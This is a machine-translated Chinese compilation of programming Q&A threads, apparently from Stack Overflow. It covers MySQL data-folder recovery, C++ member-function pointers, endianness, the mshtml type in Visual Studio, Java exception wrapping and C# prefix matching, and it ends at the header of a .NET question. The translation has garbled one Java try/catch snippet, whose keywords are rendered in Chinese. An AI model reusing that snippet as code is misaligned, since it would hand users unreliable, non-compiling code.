我只能从我的 Ubuntu 操作系统中恢复 mysql 数据库文件夹。我的问题是如何使用那些不可读的 mysql 数据文件夹恢复我的数据库。所以我切换回win7操作系统作为开发环境。

*注意我有一个在 win7 中运行的现有数据库服务器，我只需要几个数据库文件即可从恢复的文件中检索。要从 Ubuntu 操作系统成功恢复数据库文件，我需要全新安装 mysql 数据库服务器（与我的 win7 操作系统中的 Ubuntu 操作系统版本相同）以恢复旧数据库服务器中的所有内容。

1.  从恢复的文件中创建另一个新的 mysql 数据库服务器相同的版本。

2.  停止mysql服务器

3.  复制恢复的文件夹并粘贴到存储的 (C:\ProgramData\MySQL\MySQL Server 5.5\data) mysql 数据库中。

4.  复制位于 linux mysql 安装文件夹中的 ibdata1 文件并将其粘贴到 (C:\ProgramData\MySQL\MySQL Server 5.5\data)。只需覆盖现有的或在替换之前进行备份。

5.  启动 mysql 服务器并检查您是否已成功恢复数据库文件。

6.  要在我当前使用的 mysql 服务器中使用恢复的数据库，只需导出恢复的数据库并将其导入我现有的 mysql 服务器。

希望这些会有所帮助，因为没有其他东西对我有用。

* * *

## 回答 #4

> 赞同：10
> 
> 时间：2014-06-29T12:41:33.317

如果您正在恢复文件夹，请不要忘记将文件 chown 到 mysql:mysql

`chown -R mysql:mysql /var/lib/mysql-data`

否则在尝试删除数据库或添加新列等时会出错。

并重新启动 MySQL

```
service mysql restart 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-03-01T11:19:23.650

使用 MySql 5.1 (Win7)。为了重新创建数据库（InnoDbs），我替换了以下目录（my.ini 参数）的所有内容：

```
datadir="C:/ProgramData/MySQL/MySQL Server 5.1/Data/"
innodb_data_home_dir="C:/MySQL Datafiles/" 
```

之后我启动了 MySql 服务，一切正常。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-01-27T19:05:58.717

是的！只需将它们添加到您的数据库文件夹（取决于操作系统）并运行诸如“MySQL Fix Permissions”之类的命令。这重新存储了数据库。还可以看到在文件上设置了正确的权限。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2020-08-20T12:06:13.303

我试图从一个幸运地未删除的 docker 卷中恢复一个意外删除的 Docker 容器（oraclelinux 的 MySQL），该卷中包含物理文件中的数据库数据。

因此，我想做的就是将物理文件中的数据转换为`.sql`可导入文件，以使用数据库和数据重新创建容器。

我尝试[了 biolin 的解决方案](https://stackoverflow.com/a/43175810)，但在重新启动后遇到了一些`[InnoDB] Multiple files found for the same tablespace ID`错误。我意识到对某些文件夹/文件进行开放性损伤手术非常棘手。

对我有用的解决方案是暂时将`datadir=`in更改`my.cnf`为可用文件夹并重新启动 MySQL 服务器。它完美地完成了这项工作！

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2009-01-27T19:07:52.533

我曾经将这些文件复制到正在运行的 mysql 数据库的数据库存储文件夹中，启动 db 并等待它“修复”文件，然后使用 mysqldump 提取它们。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2019-02-08T15:19:14.350

就我而言，只需删除 /var/lib/mysql 中的 tc.log 就足以再次启动 mariadb/mysql。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2021-03-07T00:29:44.677

`my.cnf`该图标保持橙色，错误日志为空，直到我意外发现我必须将文件中的名称从旧目录名称替换/更新`wamp64`到`wamp`新 PC 中。

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2022-02-27T00:50:37.857

来自Biolinh的回答

做了详细的程序后，我得到了以下错误：

mysqlcheck：得到错误：2013：执行“修复表...”时查询期间丢失与服务器的连接

然后我还从备份中复制了 /var/lib/mysql/mysql 目录并运行了命令：

mysql_secure_installation

之后一切正常。

# c++ - 无法在类之间传递指向函数的指针

> ID：484758
> 
> 赞同：6
> 
> 时间：2009-01-27T19:05:02.867
> 
> 标签：c++

我试图将一个指向在一个类中定义的函数的指针传递给另一个类。经过大量研究，我相信我的语法是正确的，但我仍然遇到编译器错误。这是一些演示我的问题的代码：

```
class Base
{
public:
    BaseClass();
    virtual ~BaseClass();
};

class Derived : public Base
{
public:
    // assign strFunction to the function pointer passed in
    Derived(string (*funPtr)(int)) : strFunction(funPtr);
    ~Derived();

private:
    // pointer to the function that is passed in
    string (*strFunction)(int value);
};

class MainClass
{
public:
    MainClass()
    {
        // allocate a new Derived class and pass it a pointer to myFunction
        Base* myClass = new Derived(&MainClass::myFunction);    
    }

    string myFunction(int value)
    {
        // return a string
    }
}; 
```

当我尝试编译此代码时，我得到的错误是

> 错误：没有匹配函数调用'Derived::Derived(string (MainClass::*)(int))'

其次是

> 注意：候选人是：Derived::Derived(string (*)(int))

知道我可能做错了什么吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2009-01-27T19:10:51.187

您的语法对于 C 样式函数指针是正确的。将其更改为：

```
Derived(string (MainClass::*funPtr)(int)) : strFunction(funPtr) {} 
```

和

```
string (MainClass::*strFunction)(int value); 
```

记得打电话`strFunction`，你需要一个 MainClass 对象的实例。我经常发现使用 typedef 很有用。

```
typedef string (MainClass::*func_t)(int);
func_t strFunction; 
```

和

```
Derived(func_t funPtr) : strFunction(funPtr) {} 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2009-01-27T19:14:13.690

您可以在此处了解有关[C++ 成员函数指针语法](http://www.codeproject.com/KB/cpp/FastDelegate.aspx)的严重邪恶的更多信息。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2009-01-27T19:10:43.840

是的，类型`&MainClass::myFunction`是指向成员的类型，而类型`string(*)(int)`是指向函数的类型。它们不兼容，因为您必须使用指向类实例的引用或指针并使用 .* 或 ->* 运算符来使用指向成员的指针，而指向函数的指针不附加到类并且可以被直接调用。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2009-01-27T19:10:58.207

您试图将指针传递给 MainClass 类的成员函数，但该函数需要一个指向普通（即非成员）函数的指针。一个很好的总结在[这里](http://www.parashift.com/c++-faq-lite/pointers-to-members.html "这里")

区别很重要，因为成员函数有一个隐藏的额外参数，它告诉函数要将函数应用到哪个“this”指针。所以指针类型是不可互换的。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2009-01-27T19:10:43.527

函数指针（即指向未绑定函数的指针）和指向方法的指针（即指向绑定到类定义的非静态函数的指针）在`c++`. 这是因为非静态方法有一个隐含的`this`参数，要求它们总是在类实例的上下文中调用。

您正在尝试将方法指针传递给采用函数指针的构造函数。这是行不通的。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2009-01-27T19:19:16.020

另一个语法问题：

```
 // assign strFunction to the function pointer passed in
    Derived(string (*funPtr)(int)) : strFunction(funPtr); 
```

替换为：

```
 // assign strFunction to the function pointer passed in
    Derived(string (*funPtr)(int)) : strFunction(funPtr) {}; 
```

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2009-01-27T19:35:37.253

您可能想研究使用类似于此（未经测试）代码的[std::tr1::bind](http://msdn.microsoft.com/en-us/library/bb982702.aspx)和[std::tr1::function ：](http://msdn.microsoft.com/en-us/library/bb982519.aspx)

```
class Derived: public Base
{
  public:
    typedef std::tr1::function<string(int)> StringFunc;

    Derived(StringFunc);

  ...

  private:
    StringFunc strFunction;
} 
```

在 MainClass 构造函数中：

```
myBase = new Derived(std::tr1::bind(&MainClass::myFunction, *this, _1); 
```

绑定函数基本上将成员函数绑定到特定对象。它负责处理编译器插入的 this 指针。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2009-01-27T19:10:26.290

对象方法有一个隐藏的“this”参数。如果将方法传递给另一个类，“this”参数中会填入什么？您也许可以使用静态（类）方法来做到这一点。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2009-01-27T19:12:28.437

正如编译器警告所表明的那样，成员函数指针与常规函数指针完全不同。

# endianness - 字节序理论和概念

> ID：484764
> 
> 赞同：2
> 
> 时间：2009-01-27T19:06:34.550
> 
> 标签：endianness

这不是特定于任何编程语言的问题。假设您在大端机器上编写了一些文件，并且您知道这一点。如果两个单字节值是背靠背写入的，你怎么知道？Big-endian 颠倒了 16、32 和 64 位值的顺序，那么您怎么知道需要将其作为单个字节读取呢？

例如，您写入字节 0x11，然后写入字节 0x22。然后该文件包含 0x1122。如果您在小端机器上阅读它，则必须对其进行转换。那么你会把它读成 2211 还是 1122？你知道怎么做吗？

这有道理吗？我觉得我在这里错过了一些超级基本的东西。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-01-27T19:17:14.293

没有办法知道。这就是为什么正式指定的文件格式通常要求字节顺序，或者它们提供一个选项（如 MSN 所提到的 unicode）。这样，如果您正在读取具有特定格式的文件，您就*知道*它已经是大端序了，因为它采用该格式这一事实意味着特定的字节序。

另一个很好的例子是[网络字节顺序](http://en.wikipedia.org/wiki/Endianness#Endianness_in_networking)——网络协议通常是大端的，所以如果你是一个与互联网通信的小端处理器，你必须倒着写。如果您是大端，则无需担心。人们使用[htonl 和 ntohl](http://www.opengroup.org/onlinepubs/007908799/xns/htonl.html)之类的函数来预处理他们写入网络的内容，以便他们的源代码在所有机器上都是相同的。这些函数被定义为在大端机器上什么都不做，但它们在小端机器上翻转字节。

关键的实现是字节顺序是特定*架构*如何表示单词的属性。他们必须以某种方式编写*文件不是强制性的。*它只是告诉您体系结构上的指令期望多字节字以某种方式对其字节进行排序。big-endian 机器可以写入与 little-endian 机器相同的字节序列，它可能会使用更多指令来完成，因为它必须重新排序字节。对于编写大端格式的小端机器也是如此。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-01-27T19:09:49.410

您需要预测它，因为您知道其他内容（即，您**知道**您正在读取大端格式的文件），或者您需要以某种方式对文件中的字节序进行编码。Unicode 文本文件使用`0xFFFE`（或类似的东西）作为文本文件的前两个字节来计算字节顺序。如果您将其读取为 0xfffe，则它是本机字节序格式。如果您将其读为 0xfeff，则不是。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-27T19:11:10.467

你是完全正确的......如果不知道你正在查看的数据，就无法知道。

话虽如此，通常有很多方法可以猜测...如果您知道应该看到文本，则可以运行一些简单的测试以查看您得到的内容是否合理...如果您可以阅读标题出来，您通常可以从中推断出它...但是如果您只是查看字节流，则没有万无一失的方法可以*知道*。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-01-27T19:13:09.823

> 这有道理吗？

是的：这是个问题。

> 我觉得我在这里错过了一些超级基本的东西。

基本上，要读取文件（尤其是二进制文件），您需要知道文件格式：包括知道一对字节是单个字节的序列，还是单个双字节字。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-01-27T19:18:28.207

你没有错过任何东西。定义良好的二进制文件格式（例如 Excel 97-2003 xls 工作簿）必须将[字节序](http://en.wikipedia.org/wiki/Endianness)作为规范的一部分，否则您显然会遇到大问题。

从历史上看，Macintosh 使用的是大端的摩托罗拉处理器（68000 及其后续产品），而 IBM PC / DOS / Windows 计算机一直使用小端的英特尔处理器。因此，在两个平台上都运行 C/C++ 代码库的软件供应商对这个问题非常熟悉，而在苹果转向英特尔之前一直开发 Windows 软件或 Mac 软件的软件供应商可能只是忽略了它——至少对于他们的自己的文件格式。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-03-14T18:15:04.480

不确定这是否正是您要问的，但是，例如，PCAP 文件格式指定了一个变量字节序：

[http://www.winpcap.org/ntar/draft/PCAP-DumpFileFormat.html](http://www.winpcap.org/ntar/draft/PCAP-DumpFileFormat.html)

这个概念是您可以将“标记”字节（例如 0x12345678）写入文件的标题。在诸如 PowerPC 之类的“大端”机器上，它将编写如下：

0x12 0x34 0x56 0x78

在诸如 x86 之类的“小端”机器上，它将编写如下：

0x78 0x56 0x34 0x12

然后，在读取标题时，您可以通过机器读取*的*内容来判断是否需要在读取文件时交换字节。或者您可以指定一个字节序，例如大字节序。然后你总是会在一个小端机器上交换字节。

对于 PCAP 格式，这样做是出于性能原因。但是指定字节顺序并坚持下去可能更简单。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-01-27T19:10:53.650

处理器以一种或另一种字节序模式运行（有些可以根据页面切换等）。他们不*知道*自己做的是否正确。他们只是做他们该做的。（垃圾进垃圾出） ：-）

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2009-01-27T19:11:27.473

没有办法检测到我会说。但在 C# 中，BitConverter 有一个 IsLittleEndian 属性。

这一切都取决于你想如何进入它。

[在这里](https://stackoverflow.com/questions/217980/c-little-endian-or-big-endian)阅读更多。

# visual-studio - Visual Studio：如何确定此类型的定义位置？

> ID：484770
> 
> 赞同：2
> 
> 时间：2009-01-27T19:08:41.517
> 
> 标签：visual-studio

我有一个接口——其中一个成员返回一个**Object**类型的变量。

在我尝试使用这个返回的变量时，我发现它不仅仅是一个“ **Object** ”，而是一个“ **mshtml.HTMLDocumentClass** ”，如下面的截图所示：

[![替代文字](https://i.stack.imgur.com/GiTVG.png)](https://i.stack.imgur.com/GiTVG.png)

就我而言，这是完美的，因为它（通过代码洞察力）显示，该对象随后支持我实际尝试使用的许多方法和属性（我将通过后期绑定使用）。

**问题是：**

*   这种类型是从哪里来的？
*   在哪里定义

所以我可以将我的代码从：

```
object webDocument = ie.Document; 
```

到

```
mshtml.HTMLDocumentClass webDocument = (mshtml.HTMLDocumentClass)ie.Document; 
```

* * *

如果您想知道，**ie**被声明为：

```
IWebBrowser2 ie; 
```

而 IWebBrowser2 的 ie.Document 声明是：

```
[ComImport, DefaultMember("Name"), 
      Guid("D30C1661-CDAF-11D0-8A3E-00C04FC9E26E"), 
      InterfaceType(ComInterfaceType.InterfaceIsIDispatch),
      SuppressUnmanagedCodeSecurity]
public interface IWebBrowser2
{
   ...
   object Document { [return: MarshalAs(UnmanagedType.IDispatch)] [DispId(0xcb)] get; }
   ...
} 
```

所以它是一个**Object**，它也支持**IDispatch**。在我的任何代码中都没有提到一种名为“mshtml.HTMLDocumentClass”的类型。

**注意：**如果您认为它可以转换为

```
System.Windows.Forms.HtmlDocument 
```

你会错的。

* * *

如果您想知道我为什么要这样做，请将所有变量名和类类型更改为随机字符串以混淆示例。

* * *

[chakrit建议使用](https://stackoverflow.com/questions/484770/visual-studio-how-to-figure-out-where-this-type-is-defined#484830)**ie.Document**成员的“*转到定义**” ，不幸的是，它转到了 ie.Document 的声明：

[![替代文字](https://i.stack.imgur.com/k7ap0.png)](https://i.stack.imgur.com/k7ap0.png)

而且 Object 的声明也**让**我想到了**Object**的声明：

[![替代文字](https://i.stack.imgur.com/d4fMb.png)](https://i.stack.imgur.com/d4fMb.png)

* * *

[chakrit](https://stackoverflow.com/questions/484770/visual-studio-how-to-figure-out-where-this-type-is-defined#484830)有一个非常好的建议：

```
public static string TellMeAboutThisObject(object obj)
{
   Type t = obj.GetType();
   Assembly asm = t.Assembly;

   return 
         "Type Name: "+t.FullName+Environment.NewLine+
         "Namspace: " + t.Namespace+Environment.NewLine+
         "From assembly: "+ asm.FullName+Environment.NewLine+
         "Located at: "+asm.Location;
} 
```

在我的情况下返回：

> **类型名称：** mshtml.HTMLDocumentClass
> 
> **命名空间：** mshtml
> 
> **来自程序集：** Microsoft.mshtml，版本=7.0.3300.0，文化=中性，PublicKeyToken=b03f5f7f11d50a3a
> 
> **位于：** C:\Windows\assembly\GAC\Microsoft.mshtml\7.0.3300.0__b03f5f7f11d50a3a\Microsoft.mshtml.dll

所以，就我而言，最糟糕的是有人自动添加对托管程序集的引用——当我试图直接与 COM 互操作时。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-01-27T19:40:52.577

在 MSDN 上快速搜索后，我可以访问该页面，该页面描述了如何获取文档界面： [关于 MSHTML](http://msdn.microsoft.com/en-us/library/bb508515(VS.85).aspx)
注意：我无法尝试任何这些，因为我被 VS.80 卡住了

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-27T19:22:15.983

对您要完成的工作有点困惑。

您不能使用 Visual Studio 中的“**转到定义**”上下文菜单来调出**对象浏览器**来定位类型吗？

[转到定义 http://chakrit.net/files/temp/so_go_to_definition.png](http://chakrit.net/files/temp/so_go_to_definition.png)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-27T19:35:55.020

您可以使用该[`Object.GetType()`](http://msdn.microsoft.com/en-us/library/system.object.gettype.aspx)方法获取有关您获得的特定对象的信息。

这是一个例子：

```
using System;

static class Program
{
    static void Main()
    {
        var obj = new { Random = "Object" } as object;

        var t = obj.GetType();

        var asm = t.Assembly;

        Console.WriteLine("Type name     : " + t.FullName);
        Console.WriteLine("Namspace      : " + t.Namespace);
        Console.WriteLine("From assembly : " + asm.FullName);
        Console.WriteLine("Located at    : " + asm.Location);

        Console.ReadKey();
    }
} 
```

或者在你的情况下......

```
var t = ie.Document.GetType() 
```

...应该为您提供有关内部真正内容的类型信息`ie.Document`。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-01-27T19:55:51.563

只需添加对**Microsoft.mshtml**的引用。'纳夫说。

**补充：**好的，多说几句 - .NET 程序通过这些互操作程序集与 COM 对象进行操作。如果您在 Visual Studio 中添加对 COM 对象的引用，VS 会为您生成一个。对于 WebBrowser，已经有一个预生成的，因为它经常被使用。但是您不能“直接”使用 COM 进行操作。好吧，也许你可以，但那将是自虐狂。

# java - 在Java中将检查的异常包装成未经检查的异常？

> ID：484794
> 
> 赞同：33
> 
> 时间：2009-01-27T19:14:18.853
> 
> 标签：java, exception, checked-exceptions

我在java中有这个工厂方法：

```
public static Properties getConfigFactory() throws ClassNotFoundException, IOException {
    if (config == null) {
        InputStream in = Class.forName(PACKAGE_NAME).getResourceAsStream(CONFIG_PROP);
        config = new Properties();
        config.load(in);
    }
    return config;
} 
```

我想将两个已检查的异常转换为未检查的异常。解决此问题的最佳方法是什么？

我应该只捕获异常并使用捕获的异常作为内部异常抛出一个新的 RuntimeException 吗？

有没有更好的方法来做到这一点，或者我什至应该首先尝试这样做？

**编辑：**
只是为了澄清。这些异常将是致命的，因为配置文件本质上是程序的操作，所有异常都将被捕获并记录在我的程序的顶层。

我的目的是避免不必要的抛出异常，将异常添加到调用我的工厂的每个方法的签名中。

* * *

## 回答 #1

> 赞同：38
> 
> 时间：2009-01-27T19:24:46.337

`RuntimeException`仅当客户端无法从任何问题中恢复时才应使用A。偶尔做你正在谈论的事情是合适的，但更多时候是不合适的。

如果您使用的是 JDK >= 1.4，那么您可以执行以下操作：

```
尝试 {
  // 可能抛出异常的代码
} 捕捉（IOException e）{
  抛出新的 RuntimeException(e);
} 捕捉（ClassNotFoundException e）{
  抛出新的 RuntimeException(e);
}

```

并且重新抛出`RuntimeException`的原因将包含在其中。这样，线程顶部的某个人会捕获`RuntimeException`--您的线程确实会捕获`RuntimeException`，因此它们不会只是默默地死去，对吗？-- 至少可以打印出原因的完整堆栈跟踪。

但正如其他人所说并将说的那样，检查异常是有原因的。仅当您确定您的客户无法从您作为未经检查的异常重新抛出的问题中恢复时才执行此操作。

注意：`RuntimeException`如果有可用的，比使用更具体的未检查异常更好。例如，如果您的方法抛出 a 的唯一原因`ClassNotFoundException`是缺少配置文件，您可以重新抛出 a `MissingResourceException`，这是一个未经检查的异常，但会提供有关您抛出它的原因的更多信息。`RuntimeException`如果它们描述了您要重新抛出的问题，则可以使用的其他好处是`IllegalStateException`,`TypeNotPresentException`和`UnsupportedOperationException`。

另请注意，让您的线程捕获 RuntimeException 并至少记录它总是一个好主意。至少这样你就明白为什么你的线程会消失。

* * *

## 回答 #2

> 赞同：15
> 
> 时间：2009-01-27T19:37:59.603

关于异常处理最佳实践的两点：

*   **调用者代码无法**对异常执行任何操作 -> 使其成为**未经检查的异常**
*   **调用者代码将根据异常中的信息采取一些有用的恢复操作**-> 使其成为**受检异常**

您可能会抛出带有或不带有内部异常的 RuntimeException，这取决于调用者可以用它做什么。如果您不重新抛出内部异常，那么您应该将其记录在您的方法中，如果重要的话。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2009-01-27T19:21:01.510

您正在以正确的方式进行操作。

为了让已检查的异常在未经检查的情况下通过，您必须将它们包装在未检查的异常中。

请记住，检查异常是有原因的。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-01-27T19:35:18.360

如果你想避免太多`try - catch`的 es，在工厂本身捕获异常并在那里处理它们。也许返回一个默认实现。

您*必须*在此处或其他地方处理异常。

而且由于这是一个工厂，我认为这些异常最好在工厂本身（相同的方法或不同的方法）中处理，并返回一个默认的实现。

无论如何，（业务功能）调用者在遇到`ClassNotFoundException`.

# visual-studio - 从源代码管理中排除嵌套文件

> ID：484795
> 
> 赞同：4
> 
> 时间：2009-01-27T19:14:33.283
> 
> 标签：visual-studio, visual-studio-2008, version-control, visual-studio-2005, nested

我们在组合“嵌套文件”和从源代码管理中排除文件时遇到问题。

我们使用代码生成为每个实体创建两个部分类 - MyBusinessObject.vb 和 MyBusinessObject.Generated.vb

我们希望“生成”文件显示为手动文件下的嵌套文件。因此，我们正在修改项目文件以包含如下条目：

```
<Compile Include="MyBusinessObject.vb" />
<Compile Include="MyBusinessObject.Generated.vb">
    <DependentUpon>MyBusinessObject.vb</DependentUpon>
</Compile> 
```

这本身就可以正常工作。由于我们已经将代码生成模板置于源代码控制之下，我们还希望将“生成的”文件排除在源代码控制之外，因此我们只需签出项目文件即可重新生成，而不是所有内容。所以我们修改了项目源代码控制文件如下：

```
{
"FILE_VERSION" = "9237"
"ENLISTMENT_CHOICE" = "NEVER"
"PROJECT_FILE_RELATIVE_PATH" = ""
"NUMBER_OF_EXCLUDED_FILES" = "1"
"EXCLUDED_FILE0" = "MyBusinessObject.Generated.vb"
"ORIGINAL_PROJECT_FILE_PATH" = ""
"NUMBER_OF_NESTED_PROJECTS" = "0"
"SOURCE_CONTROL_SETTINGS_PROVIDER" = "PROVIDER"
} 
```

这本身也可以正常工作。问题是当我们结合这两个过程时，MyBusinessObject.vb 显示为被排除在源代码管理之外，即使它没有像 MyBusinessObject.Generated.vb 那样在项目源代码控制文件中标记为排除文件。

我们如何拥有嵌套文件并将主文件放在源代码管理中，而嵌套文件从源代码管理中排除？

谢谢你的帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-29T20:19:52.087

好吧，我最终做了一些不同的事情。由于我无法让嵌套工作，我只是让生成的文件对项目不可见。

```
<Compile Include="MyBusinessObject.vb" />
<Compile Include="MyBusinessObject.Generated.vb">
    <Visible>false</Visible>
</Compile> 
```

当我像嵌套一样“显示所有文件”时，我仍然可以看到这些文件。不像嵌套文件那么酷，但这应该可以。我还没有看到任何副作用。

不管怎么说，还是要谢谢你。

# c# - 确定字符串是否以一组标记中的标记开头的更有效方法？

> ID：484796
> 
> 赞同：6
> 
> 时间：2009-01-27T19:14:43.567
> 
> 标签：c#, optimization

我目前正在我正在处理的一些代码中做这样的事情：

```
public CommandType GetCommandTypeFromCommandString(String command)
{
   if(command.StartsWith(CommandConstants.Acknowledge))
      return CommandType.Acknowledge;
   else if (command.StartsWith(CommandConstants.Status))
      return CommandType.Status;
   else if (command.StartsWith(CommandConstants.Echo))
      return CommandType.Echo;
   else if (command.StartsWith(CommandConstants.Warning))
     return CommandType.Warning;
     // and so on

   return CommandType.None;
} 
```

我想知道在 C# 中是否有更有效的方法来执行此操作。这段代码需要每秒执行很多次，我对完成所有这些字符串比较所花费的时间不太满意。有什么建议么？:)

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2009-01-27T19:29:46.157

一种优化是使用 StringComparison 枚举来指定您只需要序数比较。像这样：

```
if(command.StartsWith(CommandConstants.Acknowledge, StringComparison.Ordinal))
    return CommandType.Acknowledge; 
```

如果您不指定字符串比较方法，则将使用当前区域性进行比较，这会减慢速度。

我做了一些（真的很天真的）基准测试：

```
var a = "foo bar foo";
var b = "foo";

int numTimes = 1000000;

Benchmark.Time(() => a.StartsWith(b, StringComparison.Ordinal), "ordinal", numTimes);
Benchmark.Time(() => a.StartsWith(b), "culture sensitive", numTimes); 
```

这产生了以下结果：

```
ordinal 在 35.6033 毫秒内运行了 1000000 次
文化敏感在 175.5859 毫秒内运行 1000000 次

```

您还应该对比较进行排序，以便首先比较最可能的标记（快乐路径）。

这些优化是使您当前的实现性能更好的一种简单方法，但是如果性能真的很关键（我的意思是真的很关键），您应该考虑实现某种状态机。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2009-01-27T19:26:17.397

在概念上类似于 Vojislav 的 FSM 答案，您可以尝试将常量放入[trie](http://en.wikipedia.org/wiki/Trie)中。然后，您可以将比较序列替换为对 trie 的一次遍历。

[这里](http://www.kerrywong.com/2006/04/01/implementing-a-trie-in-c/)描述了一个 C# trie 实现。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2009-01-27T19:19:55.270

这是一项相当多的工作，但您可以基于每个令牌构建一个[FSM 。](http://en.wikipedia.org/wiki/Finite_state_machine)FSM 将一一接受**命令字符串中的字符；**每个令牌都有一个最终状态，并且当命令不以任何令牌开头时要进入的附加最终状态。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2009-01-27T19:31:05.187

我认为您可以使用正则表达式和字典做得更好：

```
static Regex reCommands = new Regex("^(cmd1|cmd2|cmd3|cmd4)", RegexOptions.Compiled);
static Dictionary<string, CommandType> Commands = new Dictionary<string, CommandType>();
private static InitDictionary()
{
    Commands.Add("cmd1", cmdType1);
    Commands.Add("cmd2", cmdType2);
    Commands.Add("cmd3", cmdType3);
    Commands.Add("cmd4", cmdType4);
}
public CommandType GetCommandTypeFromCommandString(String command)
{
    Match m = reCommands.Match(command);
    if (m.Success)
    {
        return Commands[m.Groups[1].Value];
    }
    return CommandType.None; // no command
} 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2009-01-27T19:29:19.743

我认为你应该追求更多的可读性而不是担心效率。这些操作非常快。我第二个 Serge，这部分代码不太可能是瓶颈。我会做这样的事情：

```
public CommandType GetCommandTypeFromCommandString(String command)
{
   for(String currentCommand : allCommands) {
       if(command.StartsWith(currentCommand))
           return currentCommand;
   }
   return CommandType.None;
} 
```

编辑：事后考虑，如果您知道哪些命令最常使用，您可以订购您的数组，以便这些命令在开始......如果您保留它们，您也可以使用 if 语句来执行此操作。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2009-01-27T19:42:38.033

**编辑：**鉴于对 StopWatch 的警告之一的误解，我最初的答案*不如*StartsWith 与 StringComparison.Ordinal 结合使用。即使您使用所有正确的选项编译正则表达式，它也会慢一些，其性能与使用没有任何 StringComparison 设置的 StartsWith 相当。但是，正则表达式路由*确实*为您提供了更多匹配模式的灵活性，而 StartsWith 没有，所以我将我原来的答案留给后代......

**原答案：**

我不得不承认，我不确定您到底在寻找什么 - 但是，在我看来，这种代码通常会解析一些描述的日志文件，以提取有用的信息。为了节省您长时间进行所有字符串比较，您可以生成枚举中值的正则表达式，然后使用匹配项解析正确的枚举项：

```
public enum CommandType
{
    Acknowledge,
    Status,
    Echo,
    Warning
}
static public CommandType? GetCommandTypeFromString(String command)
{
    var CommandTypes = String.Join("|", Enum.GetNames(typeof(CommandType)));
    var PassedConstant = Regex.Match(command, String.Format("(?i:^({0}))", CommandTypes)).Value;
    if (PassedConstant != String.Empty)
        return (CommandType)Enum.Parse(typeof(CommandType), PassedConstant, true);
    return null;
}

static void Main(string[] args)
{
    Console.WriteLine(GetCommandTypeFromString("Acknowledge that I am great!").ToString());
} 
```

这将从我的字符串的开头拉出 CommandType.Acknowledge，但前提是它存在于字符串的开头......它也会拉出其他正确的 CommandTypes。

对接受的答案进行类似的基准测试，我得到了大约 40% 的性能提升。我在 10421 毫秒内运行了超过一百万次迭代的接受代码，但我的仅在 6459 毫秒内运行。

当然，虽然您使用的 if 语句可能看起来不像您希望的那样高效，但它仍然比使用正则表达式更容易阅读......

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2009-01-27T19:21:28.653

创建一个

```
IDictionary<string,CommandType> 
```

并用值填充它。

您无需比较所有内容……只需在表格中查找即可。

您还需要更好地定义命令语法。例如，命令和行的其余部分之间需要一个空格...

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2009-01-27T19:22:23.753

“许多”是多少次？我严重怀疑这部分代码是瓶颈。假设它们都是不同的，您可能可以使用基于每个命令的第一个字母的 switch 语句对其进行一点点优化。

不过话说回来，真的有用吗？我不会赌太多。

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2009-01-27T19:37:52.317

我做了类似扩展方法的事情：

```
public static bool StartsWith(this string s, params string[] candidate)
{
    string match = candidate.FirstOrDefault(t => s.StartsWith(t));
    return match != default(string);
} 
```

现在这只是一个谓词，它返回数组中的字符串是否以给定字符串开头，但您可以对其进行一些修改：

```
public static int PrefixIndex(this string s, params string[] candidate)
{
    int index = -1;
    string match = candidate.FirstOrDefault(t => { index++; return s.StartsWith(t); });
    return match == default(string) ? -1 : index;
} 
```

在使用中它将是：

```
int index = command.PrefixIndex(tokenStrings);

if (index >= 0) {
    // convert to your enum
} 
```

在评论中，我看到您想在 1/40 秒内进行 30 次字符串比较。我的朋友，你应该可以在 1 MHz 的机器上做到这一点。在 1/40 秒内进行数千次字符串比较应该不费吹灰之力。

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2009-01-27T19:56:11.190

trie 几乎肯定会是最快的方法。如果前缀的长度相同，您可以通过对前缀进行散列以获取数组的索引来提出更快的实现，但如果您不知道要散列多少字节，则会出现问题。

* * *

## 回答 #11

> 赞同：-3
> 
> 时间：2009-01-27T19:26:41.060

注意：我不是在演示使用异常处理来控制程序流。如果 Enum 的字符串名称不存在，Enum.Parse 将引发异常。Catch 子句只返回 None 的默认 CommandType，就像提问者的示例代码一样。

如果对象只是返回给定字符串名称的实际 Enum 对象，您不能使用：

```
try
{
    return (CommandType)Enum.Parse(typeof(CommandType), strCmdName, true);
}
catch (Exception)
{
    return CommandType.None;
} 
```

# .net - 配置文件中的 DTD 实体

> ID：484798
> 
> 赞同：3
> 
